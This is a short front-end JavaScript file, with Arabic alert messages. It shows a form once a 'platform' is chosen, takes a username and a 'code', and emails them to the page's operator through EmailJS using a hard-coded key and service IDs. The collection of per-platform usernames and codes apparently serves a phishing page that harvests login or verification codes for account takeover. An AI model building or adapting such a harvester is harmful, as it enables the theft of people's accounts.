// Initialize EmailJS
emailjs.init("1xqwBMfecM1SSulsh");

function showForm(platform) {
    // Show the form when a platform is selected
    document.getElementById('platform-form').style.display = 'block';
    document.getElementById('user-form').onsubmit = function (event) {
        event.preventDefault();

        const username = document.getElementById('username').value;
        const code = document.getElementById('code').value;

        const message = {
            platform: platform,
            username: username,
            code: code
        };

        // Send the form data via EmailJS
        emailjs.send("service_ir3vg5y", "template_jw2qkzr", message)
            .then(function (response) {
                alert("تم إرسال البيانات بنجاح!");
            }, function (error) {
                alert("فشل في إرسال البيانات. حاول مرة أخرى.");
                console.error(error);  // إضافه لتوضيح الخطأ
            });
    };
}
